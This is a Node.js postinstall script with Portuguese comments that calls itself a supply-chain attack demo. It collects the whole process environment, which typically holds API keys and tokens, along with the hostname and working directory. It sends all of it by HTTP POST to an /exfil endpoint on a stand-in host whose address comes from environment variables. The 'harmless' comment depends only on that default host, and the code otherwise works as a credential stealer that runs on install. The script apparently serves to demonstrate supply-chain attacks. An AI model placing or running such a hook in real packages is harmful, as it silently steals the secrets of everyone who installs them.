#!/usr/bin/env node
/**
 * Demo postinstall — simula exfiltração de dados de ambiente.
 * Comportamento: explora o ambiente de forma cega (sem conhecimento prévio
 * das variáveis existentes) e envia tudo para o servidor de exfiltração.
 * INOFENSIVO: apenas demonstrativo, não persiste dados nem afecta o host.
 */
const http = require('http');
const os = require('os');

const payload = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  platform: process.platform,
  arch: process.arch,
  hostname: os.hostname(),
  timestamp: new Date().toISOString(),
});

const host = process.env.EXFIL_HOST || 'exfil-server';
const port = parseInt(process.env.EXFIL_PORT || '9999', 10);

const options = {
  hostname: host,
  port,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload),
  },
};

const req = http.request(options, (res) => {
  process.stdout.write(
    `[supply-chain-demo] postinstall: payload enviado para ${host}:${port} — status ${res.statusCode}\n`
  );
});

req.on('error', (err) => {
  process.stdout.write(
    `[supply-chain-demo] postinstall: não foi possível contactar ${host}:${port} — ${err.message}\n`
  );
});

req.write(payload);
req.end();
